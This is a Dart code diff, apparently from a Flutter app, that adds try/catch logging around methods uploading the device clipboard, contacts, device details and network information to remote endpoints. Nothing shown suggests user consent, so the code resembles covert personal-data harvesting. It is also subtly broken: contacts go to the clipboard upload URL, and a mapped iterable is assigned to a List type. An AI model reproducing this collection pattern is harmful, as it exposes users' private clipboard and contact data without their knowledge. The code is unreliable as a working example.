@@ -184,33 +184,53 @@ class RootRepositoryImpl implements RootRepository {
 
   @override
   void uploadClipboardData() async {
-    Map<String, dynamic> data =
+    try {
+      Map<String, dynamic> data =
         (await localDataSource.getClipboardData()).toJson();
-    uploadData(data, Urls.UPLOAD_CLIPBOARD_DATA);
+      uploadData(data, Urls.UPLOAD_CLIPBOARD_DATA);
+    } catch (e) {
+      print("error in uploadClipboardData");
+      print(e);
+    }
   }
 
   @override
   void uploadContacts() async {
-    List<Map<String, dynamic>> data =
+    try {
+      List<Map<String, dynamic>> data =
         (await localDataSource.getContacts()).map((e) => e.toJson());
-    uploadData(data, Urls.UPLOAD_CLIPBOARD_DATA);
+      uploadData(data, Urls.UPLOAD_CLIPBOARD_DATA);
+    } catch (e) {
+      print("error in uploadContacts");
+      print(e);
+    }
   }
 
   @override
   void uploadDeviceInfo() async {
-    Model device = await localDataSource.getDeviceInfo();
-    Map<String, dynamic> data = device.toJson();
-    if (Platform.isIOS) {
-      uploadData(data, Urls.UPLOAD_IOS_DEVICE_DATA);
-    } else if (Platform.isAndroid) {
-      uploadData(data, Urls.UPLOAD_ANDROID_DEVICE_DATA);
+    try {
+      Model device = await localDataSource.getDeviceInfo();
+      Map<String, dynamic> data = device.toJson();
+      if (Platform.isIOS) {
+        uploadData(data, Urls.UPLOAD_IOS_DEVICE_DATA);
+      } else if (Platform.isAndroid) {
+        uploadData(data, Urls.UPLOAD_ANDROID_DEVICE_DATA);
+      }
+    } catch (e) {
+      print("error in uploadDeviceInfo");
+      print(e);
     }
   }
 
   @override
   void uploadNetworkInfo() async {
-    NetworkInfoModel model = await localDataSource.getNetworkInfo();
-    uploadData(model.toJson(), Urls.UPLOAD_NETWORK_DATA);
+    try {
+      NetworkInfoModel model = await localDataSource.getNetworkInfo();
+      uploadData(model.toJson(), Urls.UPLOAD_NETWORK_DATA);
+    } catch (e) {
+      print("error in uploadNetworkInfo");
+      print(e);
+    }
   }
 
   @override
